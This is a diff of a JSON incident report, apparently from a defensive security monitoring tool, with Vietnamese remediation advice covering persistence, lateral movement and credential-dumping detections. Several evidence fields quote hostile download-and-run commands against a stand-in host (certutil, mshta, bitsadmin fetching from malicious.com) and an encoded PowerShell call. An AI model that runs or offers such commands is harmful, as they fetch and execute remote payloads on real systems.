@@ -1,17 +1,17 @@
 {
-  "timestamp": "2026-09-05T19:33:20.339357",
+  "timestamp": "2026-09-05T19:44:02.295261",
   "question": "Có sự cố gì cần xử lý?",
-  "total_incidents": 9,
+  "total_incidents": 18,
   "by_severity": {
-    "CRITICAL": 1,
-    "HIGH": 8
+    "CRITICAL": 7,
+    "HIGH": 11
   },
   "by_status": {
-    "OPEN": 9
+    "OPEN": 18
   },
   "incidents": [
     {
-      "incident_id": "INC-0005",
+      "incident_id": "INC-0004",
       "severity": "CRITICAL",
       "status": "OPEN",
       "title": "PERSISTENCE THREAT: WMI Event Consumer Subscription",
@@ -23,23 +23,109 @@
         "Filter to Consumer Binding"
       ],
       "recommended_action": "Kiểm tra WMI event subscribers, xóa các subscriptions lạ",
-      "created_at": "2026-09-05T19:33:20.320976"
+      "created_at": "2026-09-05T19:44:02.215988"
+    },
+    {
+      "incident_id": "INC-0010",
+      "severity": "CRITICAL",
+      "status": "OPEN",
+      "title": "LATERAL MOVEMENT THREAT: PsExec/Remote Execution",
+      "description": "Lateral movement pattern: PsExec/Remote Execution",
+      "assets": [
+        "All systems"
+      ],
+      "evidence": [
+        "PSEXESVC service installation",
+        "Remote service creation",
+        "Admin share access (IPC$, ADMIN$)",
+        "Service pipe access"
+      ],
+      "recommended_action": "Điều tra toàn bộ assets, kiểm tra audit logs",
+      "created_at": "2026-09-05T19:44:02.261357"
+    },
+    {
+      "incident_id": "INC-0013",
+      "severity": "CRITICAL",
+      "status": "OPEN",
+      "title": "LATERAL MOVEMENT THREAT: Kerberos Delegation Abuse",
+      "description": "Lateral movement pattern: Kerberos Delegation Abuse",
+      "assets": [],
+      "evidence": [
+        "Unconstrained delegation usage",
+        "Constrained delegation abuse",
+        "Service for User (S4U) activity",
+        "Ticket granting anomalies"
+      ],
+      "recommended_action": "Kiểm tra Kerberos delegation settings, audit ticket generation",
+      "created_at": "2026-09-05T19:44:02.261357"
+    },
+    {
+      "incident_id": "INC-0014",
+      "severity": "CRITICAL",
+      "status": "OPEN",
+      "title": "CREDENTIAL DUMPING: LSASS Memory Access",
+      "description": "Credential threat: LSASS Memory Access",
+      "assets": [],
+      "evidence": [
+        "LSASS.exe memory read access",
+        "SeDebugPrivilege abuse",
+        "Process handle duplication",
+        "Suspicious API calls (ReadProcessMemory, etc.)"
+      ],
+      "recommended_action": "Kiểm tra ngay lập tức, isolate affected systems",
+      "created_at": "2026-09-05T19:44:02.295261"
+    },
+    {
+      "incident_id": "INC-0015",
+      "severity": "CRITICAL",
+      "status": "OPEN",
+      "title": "CREDENTIAL DUMPING: Mimikatz Activity",
+      "description": "Credential threat: Mimikatz Activity",
+      "assets": [],
+      "evidence": [
+        "sekurlsa.dll module load",
+        "wdigest registry modifications",
+        "Credential provider abuse",
+        "Golden ticket generation",
+        "Pass-the-hash activity"
+      ],
+      "recommended_action": "Reset tất cả passwords, kiểm tra kerberos tickets",
+      "created_at": "2026-09-05T19:44:02.295261"
+    },
+    {
+      "incident_id": "INC-0016",
+      "severity": "CRITICAL",
+      "status": "OPEN",
+      "title": "CREDENTIAL DUMPING: Kerberos Ticket Extraction",
+      "description": "Credential threat: Kerberos Ticket Extraction",
+      "assets": [],
+      "evidence": [
+        "Klist command execution",
+        "Kerberos cache manipulation",
+        "Ticket file access anomalies",
+        "KRBTGT ticket access"
+      ],
+      "recommended_action": "Kiểm tra Kerberos logs, reset KRBTGT password",
+      "created_at": "2026-09-05T19:44:02.295261"
+    },
+    {
+      "incident_id": "INC-0017",
+      "severity": "CRITICAL",
+      "status": "OPEN",
+      "title": "CREDENTIAL DUMPING: SAM Database Dumping",
+      "description": "Credential threat: SAM Database Dumping",
+      "assets": [],
+      "evidence": [
+        "Registry hive export attempts",
+        "SAM/SYSTEM/SECURITY file copies",
+        "Volume Shadow Copy abuse (VSS)",
+        "Reg command (reg save) usage"
+      ],
+      "recommended_action": "Kiểm tra registry access logs, audit VSS usage",
+      "created_at": "2026-09-05T19:44:02.295261"
     },
     {
       "incident_id": "INC-0001",
-      "severity": "HIGH",
-      "status": "OPEN",
-      "title": "Sự kiện nghi ngờ: Level Change",
-      "description": "Level Change",
-      "assets": [],
-      "evidence": [
-        "Mức rủi ro thay đổi: LOW → MEDIUM"
-      ],
-      "recommended_action": "Điều tra sự kiện",
-      "created_at": "2026-09-05T19:33:20.310941"
-    },
-    {
-      "incident_id": "INC-0002",
       "severity": "HIGH",
       "status": "OPEN",
       "title": "PERSISTENCE THREAT: Registry Run Key Modification",
@@ -50,10 +136,10 @@
         "HKLM\\Software\\Microsoft\\Windows\\CurrentVersion\\Run"
       ],
       "recommended_action": "Kiểm tra registry run keys, xóa entries lạ",
-      "created_at": "2026-09-05T19:33:20.320976"
+      "created_at": "2026-09-05T19:44:02.215988"
     },
     {
-      "incident_id": "INC-0003",
+      "incident_id": "INC-0002",
       "severity": "HIGH",
       "status": "OPEN",
       "title": "PERSISTENCE THREAT: Startup Folder Persistence",
@@ -64,10 +150,10 @@
         "C:\\ProgramData\\Microsoft\\Windows\\Start Menu\\Programs\\StartUp"
       ],
       "recommended_action": "Kiểm tra Startup folders, xóa files lạ",
-      "created_at": "2026-09-05T19:33:20.320976"
+      "created_at": "2026-09-05T19:44:02.215988"
     },
     {
-      "incident_id": "INC-0004",
+      "incident_id": "INC-0003",
       "severity": "HIGH",
       "status": "OPEN",
       "title": "PERSISTENCE THREAT: Malicious Service",
@@ -78,10 +164,10 @@
         "registry services entries"
       ],
       "recommended_action": "Kiểm tra services mới, xóa nếu lạ",
-      "created_at": "2026-09-05T19:33:20.320976"
+      "created_at": "2026-09-05T19:44:02.215988"
     },
     {
-      "incident_id": "INC-0006",
+      "incident_id": "INC-0005",
       "severity": "HIGH",
       "status": "OPEN",
       "title": "SUSPICIOUS PROCESS: PowerShell.exe",
@@ -92,10 +178,10 @@
         "Command: powershell.exe -enc JABjAG8A..."
       ],
       "recommended_action": "Điều tra process PowerShell.exe, cân nhắc terminate nếu xác nhận malicious",
-      "created_at": "2026-09-05T19:33:20.339357"
+      "created_at": "2026-09-05T19:44:02.245480"
     },
     {
-      "incident_id": "INC-0007",
+      "incident_id": "INC-0006",
       "severity": "HIGH",
       "status": "OPEN",
       "title": "SUSPICIOUS PROCESS: certutil.exe",
@@ -106,10 +192,10 @@
         "Command: certutil.exe -urlcache -f http://malicious.com/file.exe"
       ],
       "recommended_action": "Điều tra process certutil.exe, cân nhắc terminate nếu xác nhận malicious",
-      "created_at": "2026-09-05T19:33:20.339357"
+      "created_at": "2026-09-05T19:44:02.245480"
     },
     {
-      "incident_id": "INC-0008",
+      "incident_id": "INC-0007",
       "severity": "HIGH",
       "status": "OPEN",
       "title": "SUSPICIOUS PROCESS: mshta.exe",
@@ -120,10 +206,10 @@
         "Command: mshta.exe http://malicious.com/payload.hta"
       ],
       "recommended_action": "Điều tra process mshta.exe, cân nhắc terminate nếu xác nhận malicious",
-      "created_at": "2026-09-05T19:33:20.339357"
+      "created_at": "2026-09-05T19:44:02.245480"
     },
     {
-      "incident_id": "INC-0009",
+      "incident_id": "INC-0008",
       "severity": "HIGH",
       "status": "OPEN",
       "title": "SUSPICIOUS PROCESS: bitsadmin.exe",
@@ -134,7 +220,74 @@
         "Command: bitsadmin.exe /transfer job /download /resume http://malicious.com/file.exe"
       ],
       "recommended_action": "Điều tra process bitsadmin.exe, cân nhắc terminate nếu xác nhận malicious",
-      "created_at": "2026-09-05T19:33:20.339357"
+      "created_at": "2026-09-05T19:44:02.245480"
+    },
+    {
+      "incident_id": "INC-0009",
+      "severity": "HIGH",
+      "status": "OPEN",
+      "title": "LATERAL MOVEMENT THREAT: SMB Lateral Movement",
+      "description": "Lateral movement pattern: SMB Lateral Movement",
+      "assets": [
+        "192.168.0.1",
+        "192.168.0.10"
+      ],
+      "evidence": [
+        "Port 445 (SMB) connections",
+        "Multiple failed SMB authentications",
+        "Unusual SMB client behavior"
+      ],
+      "recommended_action": "Kiểm tra SMB logs, xác minh kết nối",
+      "created_at": "2026-09-05T19:44:02.261357"
+    },
+    {
+      "incident_id": "INC-0011",
+      "severity": "HIGH",
+      "status": "OPEN",
+      "title": "LATERAL MOVEMENT THREAT: WinRM Remote Management",
+      "description": "Lateral movement pattern: WinRM Remote Management",
+      "assets": [],
+      "evidence": [
+        "Port 5985/5986 (WinRM)",
+        "Kerberos/NTLM auth from unusual sources",
+        "PSRemoting connection attempts",
+        "WinRM service abuse"
+      ],
+      "recommended_action": "Kiểm tra WinRM logs, audit remote sessions",
+      "created_at": "2026-09-05T19:44:02.261357"
+    },
+    {
+      "incident_id": "INC-0012",
+      "severity": "HIGH",
+      "status": "OPEN",
+      "title": "LATERAL MOVEMENT THREAT: Remote Desktop Protocol Abuse",
+      "description": "Lateral movement pattern: Remote Desktop Protocol Abuse",
+      "assets": [],
+      "evidence": [
+        "Multiple RDP login attempts",
+        "RDP from non-standard hours",
+        "RDP from unusual geolocation",
+        "RDP to sensitive systems"
+      ],
+      "recommended_action": "Kiểm tra RDP event logs, xác minh logins",
+      "created_at": "2026-09-05T19:44:02.261357"
+    },
+    {
+      "incident_id": "INC-0018",
+      "severity": "HIGH",
+      "status": "OPEN",
+      "title": "CREDENTIAL DUMPING: Credential Transmission Over Network",
+      "description": "Credential threat: Credential Transmission Over Network",
+      "assets": [],
+      "evidence": [
+        "HTTP authentication attempts",
+        "Telnet/FTP usage",
+        "Unencrypted LDAP",
+        "WinRM without encryption",
+        "Plaintext SMB auth"
+      ],
+      "recommended_action": "Enforce encryption, disable plaintext protocols",
+      "created_at": "2026-09-05T19:44:02.295261"
     }
   ]
 }
